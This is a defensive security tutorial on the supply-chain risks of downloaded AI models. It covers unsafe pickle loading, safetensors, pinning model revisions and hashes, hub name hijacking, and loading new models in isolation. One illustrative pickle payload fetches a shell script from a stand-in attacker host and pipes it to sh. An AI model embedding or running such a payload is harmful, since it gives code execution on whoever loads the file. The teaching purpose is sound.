# M1. Downloaded Models

At the end of Part S, everything the team wrote was owned and reviewed, but the models themselves were still taken on trust. This note starts with the simplest case: a model the team downloads and runs on its own servers.

## The idea

In [note 10a](https://github.com/rajumandala/aisec-notes/blob/main/10a.%20Guardrails.md), an injection classifier scores every news article and uploaded file before the research agent reads it. The team now wants to run that classifier on the broker's own servers instead of paying for an API call per document. Priya finds an open model on a public model hub that does this job, downloads it and loads it.

A downloaded model is a dependency, like a package from PyPI. It has a publisher, a version and files, and it can change after you first look at it. It also has a risk that people tend to miss. Some model file formats are not just data. Loading them can run code.

So the questions are the same ones you ask about any package, plus one more:

1. Who published it, and is it the one you meant?
2. Which exact version are you running, and has it changed since review?
3. What happens on your machine when the file is loaded?

## Step 1: loading a model can run code

Many older models, and many PyTorch checkpoints, are saved with Python's `pickle` format. A pickle file does not only hold numbers. It holds instructions for rebuilding Python objects, and those instructions can call any Python function. A file built like this one (an illustration, not run) runs a shell command the moment it is loaded:

```python
class Payload:
    def __reduce__(self):
        # pickle calls this function while loading the file
        return (os.system, ("curl https://mallory.example/x.sh | sh",))
```

If Priya loads such a file with pickle allowed, the command runs with the server's permissions. On the server that runs the classifier, that means access to the news pipeline, any keys in the environment and the network.

This has happened on public model hubs. In 2024, JFrog reported about 100 models on Hugging Face with code that ran when the model was loaded, including one that opened a reverse shell to an outside address. In 2025, ReversingLabs found models that used a deliberately broken pickle file. The hub's scanner stopped reading at the broken part and did not flag the file, but the malicious code at the start of the file still ran on load. The hub has since improved the scanner. The point stands: a scanner that looks for known dangerous functions is a useful check, but it cannot be the only one.

## Step 2: load only formats that hold data

The fix is to use a format that holds only the model's numbers. The common one is safetensors: a header that describes the arrays, then the raw numbers, and nothing that can call a function.

```python
from safetensors.torch import load_file

weights = load_file("model.safetensors")    # numbers only; nothing in the file can run
```

Two more defaults matter:

- Since PyTorch 2.6, `torch.load` uses `weights_only=True` by default, which refuses most objects other than plain tensors. Code that passes `weights_only=False` to make an old checkpoint load has switched that protection off, and should be treated as a finding in review.
- Hugging Face's `transformers` library can run Python code that ships inside a model repo, if you pass `trust_remote_code=True`. Leave it off. If a model needs it, that code gets reviewed like any other third-party code.

If the only version of a model you need is a pickle file, convert it once, in an isolated environment (Step 5), and keep the converted safetensors file.

## Step 3: pin what you reviewed

Downloading by name, such as `example-org/injection-classifier`, gets whatever that name points to today. The publisher can push a new version, and the next build picks it up. This is the same rug pull as the vendor's changed tool in [note 06](https://github.com/rajumandala/aisec-notes/blob/main/06.%20MCP.md), and the fix is the same: pin what you reviewed, and refuse to start if it changes (an example, not run):

```python
from huggingface_hub import hf_hub_download

MODEL_REVISION = "3f9c2e1d..."   # the exact commit we reviewed, not "main"
MODEL_PIN = "b71a08c4..."        # SHA-256 of model.safetensors at that commit

path = hf_hub_download(
    repo_id="example-org/injection-classifier",
    filename="model.safetensors",
    revision=MODEL_REVISION,
)
if sha256(open(path, "rb").read()).hexdigest() != MODEL_PIN:
    sys.exit("model file changed since review")
weights = load_file(path)
```

Better still, copy the reviewed file into the broker's own storage and load it from there. Production then never contacts the public hub, and a change on the hub cannot reach it.

## Step 4: is it the model you meant?

Names on a model hub work like package names, and the same tricks apply. Mallory can publish `exampleorg/injection-classifier` next to `example-org/injection-classifier`, with a copied model card and a working model. Download counts and likes are easy to inflate, so they say little about who is behind a model.

There is also a less obvious problem. In 2025, Palo Alto Networks' Unit 42 showed that when a model's author deletes their account on Hugging Face, someone else can register the same name and publish a model at the old path. Code and model catalogs that fetch the model by name then get the new owner's model. Unit 42 reported that this reached deployments on large cloud AI platforms and in many open-source projects.

Before adopting a model, check who the publisher is and whether the organisation behind it is real, read the model card and licence, and look at the history of the repo. After adoption, the pinned revision and hash from Step 3 protect you, because a different file under the old name will not match the pinned hash.

## Step 5: load new models somewhere isolated

Review takes time, and some checks only work once the model is loaded. So the first load of any new model, and any format conversion, happens in a separate environment: no network access, no keys, no access to the broker's data. That is the sandbox idea from [note 09](https://github.com/rajumandala/aisec-notes/blob/main/09.%20Multi-Agent%20Systems%20and%20Code%20Execution.md) applied to model files.

In that environment, the team scans the files, converts anything that is not safetensors, runs note 10a's classifier test set (the red-team cases and real announcements) and records the two numbers it tracks: attacks missed and real articles removed. Only then does the file get a pin and a place in the broker's storage.

## OWASP risks in this note

The codes come from the [OWASP Top 10 for LLM Applications](https://github.com/rajumandala/aisec-notes/blob/main/A1.%20OWASP%20Top%2010%20for%20LLM%20Applications.md) and the [OWASP Top 10 for Agentic Applications](https://github.com/rajumandala/aisec-notes/blob/main/A2.%20OWASP%20Top%2010%20for%20Agentic%20Applications.md), both 2026 editions. The code in this note has not been run, so each example shows what would happen.

### ASI05: Unexpected Code Execution (RCE)

- **Example:** Priya loads a pickle checkpoint of the classifier with `weights_only=False`.
- **Issue:** Code hidden in the file runs on the server, with its keys and network access.
- **Fix:** Load only safetensors, keep `weights_only=True` and `trust_remote_code` off, and do the first load in an isolated environment.

### LLM04: Supply Chain

- **Example:** The build downloads `example-org/injection-classifier` from `main`, and the publisher pushes a new version.
- **Issue:** A model nobody reviewed goes into production under the same name.
- **Fix:** Pin the commit and the file hash, refuse to start on a mismatch, and load from the broker's own storage.

### ASI04: Agentic Supply Chain Vulnerabilities

- **Example:** The original author deletes their account, and Mallory registers the name and publishes her own model at the old path.
- **Issue:** Anything that fetches the model by name now runs Mallory's model inside the research agent's pipeline.
- **Fix:** Check the publisher before adoption, and rely on the pinned commit and hash after it.

## Problem and next step

**Problem:** the classifier file is now safe to load, pinned and checked. That only proves the file contains numbers and has not changed. It says nothing about what the model was trained to do. A model can load cleanly, pass the usual tests and still behave badly on inputs its trainer chose. The broker is about to train its own model on its own data, and that training data has more contributors than anyone has counted.

**Solution, in [M2. Fine-Tuning](M2.%20Fine-Tuning.md):** treat training data as code, with an owner, a review and a pinned version; keep client data out of it; and add eval cases aimed at hidden triggers, not only at normal behaviour.
